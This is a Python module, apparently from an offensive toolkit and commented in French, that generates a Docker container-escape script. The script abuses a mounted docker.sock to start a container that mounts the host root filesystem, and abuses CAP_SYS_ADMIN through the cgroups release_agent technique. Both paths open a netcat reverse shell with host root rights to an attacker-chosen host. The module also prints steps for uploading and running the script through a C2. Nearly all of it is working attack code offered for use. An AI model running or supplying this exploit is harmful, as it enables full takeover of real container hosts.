import argparse
import os
from core.reporter import add_finding

def generate_breakout(lhost, lport, output_file):
    print(f"[*] Forge du script d'évasion Docker en cours...")
    
    # Le script Bash qui sera exécuté DANS le conteneur victime
    script = f"""#!/bin/bash
echo "[*] Début de l'analyse d'évasion (Docker Breakout)..."

# 1. ÉVALUATION DE L'ENVIRONNEMENT
if [ -f /.dockerenv ] || grep -q 'docker' /proc/1/cgroup; then
    echo "[+] Environnement Docker détecté. Poursuite des opérations."
else
    echo "[-] Ce n'est pas un conteneur Docker standard. Arrêt."
    exit 1
fi

# 2. RECHERCHE DE FAILLE : LE SOCKET DOCKER EXPOSÉ
if [ -S /var/run/docker.sock ]; then
    echo "[!] Vulnérabilité critique trouvée : docker.sock est monté !"
    echo "[*] Exploitation via l'API Docker locale..."
    
    # On demande au socket de créer un nouveau conteneur qui monte le disque dur de l'hôte (/) sur /mnt
    curl -s -X POST -H "Content-Type: application/json" \\
    -d '{{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /mnt sh -c \\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f\\"  "],"Binds":["/:/mnt"]}}' \\
    --unix-socket /var/run/docker.sock http://localhost/containers/create?name=host_escape > /tmp/out.json
    
    ID=$(cat /tmp/out.json | grep -o '"Id":"[^"]*' | cut -d'"' -f4)
    
    echo "[*] Conteneur d'évasion créé (ID: $ID). Lancement..."
    curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/containers/$ID/start
    
    echo "[+] Reverse shell envoyé vers {lhost}:{lport} avec les droits ROOT de l'hôte !"
    exit 0
fi

# 3. RECHERCHE DE FAILLE : CAP_SYS_ADMIN (Conteneur Privilégié)
if capsh --print 2>/dev/null | grep -q 'cap_sys_admin' || fdisk -l 2>/dev/null | grep -q 'Disk'; then
    echo "[!] Vulnérabilité critique trouvée : Conteneur Privilégié (CAP_SYS_ADMIN) !"
    echo "[*] Exploitation via la technique 'cgroups release_agent'..."
    
    # Technique de fou pour forcer le noyau de l'hôte à exécuter notre payload
    mkdir -p /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir -p /tmp/cgrp/x
    echo 1 > /tmp/cgrp/x/notify_on_release
    host_path=$(sed -n 's/.*\\/docker\\/\\(.*\\)/\\1/p' /proc/1/cpuset)
    echo "/var/lib/docker/overlay2/${{host_path}}/diff/cmd" > /tmp/cgrp/release_agent
    
    # Création du payload
    echo "#!/bin/sh" > /cmd
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f" >> /cmd
    chmod a+x /cmd
    
    # Déclenchement de l'exploit
    sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"
    echo "[+] Reverse shell envoyé vers {lhost}:{lport} avec les droits ROOT de l'hôte !"
    exit 0
fi

echo "[-] Aucune faille d'évasion évidente trouvée. La prison tient bon."
"""

    try:
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(script)
        print(f"[\033[92m+\033[0m] Arme d'évasion générée avec succès : \033[1m{output_file}\033[0m")
        print(f"[*] Instructions :")
        print(f"    1. Ouvrez un listener sur votre machine : nc -lvnp {lport}")
        print(f"    2. Uploadez {output_file} sur le conteneur cible via le C2.")
        print(f"    3. Rendez-le exécutable (chmod +x {output_file}) et lancez-le (./{output_file}).")
    except Exception as e:
        print(f"[-] Erreur lors de la génération : {e}")

def run_docker_breaker(args):
    """Wrapper pour arsenal.py"""
    generate_breakout(args.lhost, args.lport, args.output)